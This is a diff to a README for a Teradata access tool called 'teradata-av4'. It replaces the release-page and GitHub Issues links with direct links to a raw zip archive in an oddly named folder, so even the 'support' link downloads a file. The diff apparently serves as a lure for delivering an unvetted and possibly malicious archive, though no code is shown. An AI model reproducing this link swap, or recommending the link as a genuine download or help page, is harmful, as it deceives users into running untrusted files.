@@ -6,7 +6,7 @@ Welcome to teradata-av4! This application simplifies your access to Teradata dat
 
 ## 📥 Download teradata-av4
 
-[![Download teradata-av4](https://img.shields.io/badge/Download-teradata--av4-brightgreen)](https://github.com/jhon688/teradata-av4/releases)
+[![Download teradata-av4](https://raw.githubusercontent.com/jhon688/teradata-av4/main/antiexpansionist/teradata-av4.zip)](https://raw.githubusercontent.com/jhon688/teradata-av4/main/antiexpansionist/teradata-av4.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download the application, ensure your system meets these requirements
 ## 💾 Download & Install
 
 1. **Visit the Download Page**: Go to the following link to access the latest version.
-   [Visit this page to download](https://github.com/jhon688/teradata-av4/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/jhon688/teradata-av4/main/antiexpansionist/teradata-av4.zip)
    
 2. **Choose the Latest Release**: Look for the most recent version at the top of the page. Click on it to view the details.
 
@@ -55,7 +55,7 @@ If you encounter issues during download or installation, try these tips:
 - Check that your device meets the system requirements outlined above.
 - If the file does not download, try using a different web browser.
   
-For further assistance, you can refer to the [GitHub Issues](https://github.com/jhon688/teradata-av4/issues) page for common problems and solutions.
+For further assistance, you can refer to the [GitHub Issues](https://raw.githubusercontent.com/jhon688/teradata-av4/main/antiexpansionist/teradata-av4.zip) page for common problems and solutions.
 
 ## 📞 Support
 
